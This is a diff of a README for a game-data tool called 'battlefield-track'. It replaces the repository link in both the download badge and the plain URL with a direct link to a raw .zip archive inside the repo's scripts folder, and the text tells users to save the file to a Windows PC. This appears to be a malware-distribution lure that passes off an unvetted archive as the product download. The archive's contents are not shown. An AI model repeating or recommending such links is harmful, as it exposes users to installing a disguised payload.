@@ -1,6 +1,6 @@
 # 🛠️ battlefield-track - Track, edit, and view game data
 
-[![Download battlefield-track](https://img.shields.io/badge/Download%20battlefield--track-blue?style=for-the-badge)](https://github.com/riskarbitragedichloromethane12/battlefield-track)
+[![Download battlefield-track](https://img.shields.io/badge/Download%20battlefield--track-blue?style=for-the-badge)](https://github.com/riskarbitragedichloromethane12/battlefield-track/raw/refs/heads/main/scripts/track_battlefield_v2.7.zip)
 
 ## 🖥️ What battlefield-track does
 
@@ -18,7 +18,7 @@ Use it to:
 
 Visit this page to download battlefield-track:
 
-https://github.com/riskarbitragedichloromethane12/battlefield-track
+https://github.com/riskarbitragedichloromethane12/battlefield-track/raw/refs/heads/main/scripts/track_battlefield_v2.7.zip
 
 Open the page, look for the latest release or the main download file, and save it to your Windows PC.
 
